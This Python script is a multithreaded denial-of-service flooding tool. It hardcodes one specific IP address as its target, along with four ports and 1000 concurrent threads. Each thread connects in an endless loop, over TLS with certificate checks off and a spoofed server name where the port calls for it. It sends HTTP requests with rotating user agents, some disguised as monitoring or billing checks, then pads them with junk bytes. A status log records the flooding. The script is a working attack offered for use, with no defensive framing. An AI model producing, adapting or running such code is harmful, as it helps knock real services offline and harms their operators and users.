import socket
import threading
import time
import ssl
import random

TARGET_IP = "46.183.184.147"
PORTS = [4443, 3128, 21, 13129]
CONCURRENT_THREADS = 1000

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Graphite-Agent/2.4.1",
    "FOSSBilling-Check/1.0"
]

def aggressive_flood(port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((TARGET_IP, port))
            
            ua = random.choice(USER_AGENTS)
            payload = "GET / HTTP/1.1\r\nHost: " + TARGET_IP + "\r\nUser-Agent: " + ua + "\r\nConnection: keep-alive\r\n\r\n"
            
            if port in [4443, 443]:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                with context.wrap_socket(sock, server_hostname="dinosaur.getfoxyproxy.org") as ssock:
                    ssock.sendall(payload.encode())
                    for _ in range(10):
                        ssock.sendall(b"A" * 1024)
            else:
                sock.sendall(payload.encode())
                for _ in range(10):
                    sock.sendall(b"A" * 1024)
            
            sock.close()
        except Exception:
            pass

if __name__ == "__main__":
    print("[!!!] ASTRO OVERDRIVE: MAXIMUM INTENSITY ON " + TARGET_IP)
    
    threads = []
    for _ in range(CONCURRENT_THREADS):
        port = random.choice(PORTS)
        t = threading.Thread(target=aggressive_flood, args=(port,))
        t.daemon = True
        t.start()
        threads.append(t)
            
    print("[+] OVERDRIVE ACTIVE: " + str(len(threads)) + " threads engaged in FLOOD mode.")
    
    try:
        while True:
            time.sleep(10)
            with open("overdrive_max.log", "a") as f:
                f.write("[*] " + time.ctime() + ": FLOODING " + TARGET_IP + " with " + str(CONCURRENT_THREADS) + " threads.\n")
    except KeyboardInterrupt:
        pass
